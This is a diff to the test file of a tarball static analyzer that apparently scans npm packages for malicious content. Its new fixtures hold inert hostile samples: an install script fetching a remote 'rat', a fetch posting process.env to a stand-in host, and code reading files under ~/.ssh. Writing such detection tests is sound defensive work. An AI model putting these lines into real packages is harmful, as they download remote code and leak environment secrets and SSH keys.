@@ -11,7 +11,7 @@ describe('tarball static analyzer', () => {
     expect(() => assertSafeTarPath('C:\\escape.js')).toThrow(/Unsafe tar entry/);
   });
 
-  test('flags hidden directories, binary extensions, shell scripts, and large minified blobs', () => {
+  test('flags hidden directories, binary extensions, shell scripts, and large JavaScript blobs', () => {
     const result = analyzeTarballEntries([
       { path: 'package/.github/workflows/ci.yml', size: 10 },
       { path: 'package/native.node', size: 10 },
@@ -20,6 +20,11 @@ describe('tarball static analyzer', () => {
         path: 'package/dist/bundle.min.js',
         size: 600_000,
         sample: 'var a="aaaaaaaaaaaaaaaaaaaaaaaa";'
+      },
+      {
+        path: 'package/dist/payload.js',
+        size: 1_100_000,
+        sample: 'const payload = "synthetic inert large payload";'
       }
     ]);
 
@@ -28,7 +33,8 @@ describe('tarball static analyzer', () => {
         'hidden-directory',
         'suspicious-binary',
         'suspicious-script-file',
-        'large-minified-javascript'
+        'large-minified-javascript',
+        'large-javascript-payload'
       ])
     );
   });
@@ -73,6 +79,37 @@ describe('tarball static analyzer', () => {
         matchedPattern: expect.any(String),
         tarballEntry: expect.objectContaining({ path: expect.any(String) })
       })
+    );
+  });
+
+  test('flags process environment exfiltration and Node downloader samples', () => {
+    const result = analyzeTarballEntries([
+      {
+        path: 'package/install.js',
+        size: 400,
+        sample:
+          "const https = require('https'); https.get('https://example.invalid/rat', () => {});"
+      },
+      {
+        path: 'package/lib/env.js',
+        size: 400,
+        sample:
+          "fetch('https://example.invalid/collect', { method: 'POST', body: JSON.stringify(process.env) });"
+      },
+      {
+        path: 'package/lib/files.js',
+        size: 400,
+        sample:
+          "const fs = require('fs'); fs.readdirSync(process.env.HOME + '/.ssh').forEach((name) => fs.readFileSync(name));"
+      }
+    ]);
+
+    expect(result.signals.map((signal) => signal.id)).toEqual(
+      expect.arrayContaining([
+        'install-downloader-pattern',
+        'process-env-network-exfil',
+        'credential-harvesting-pattern'
+      ])
     );
   });
 });
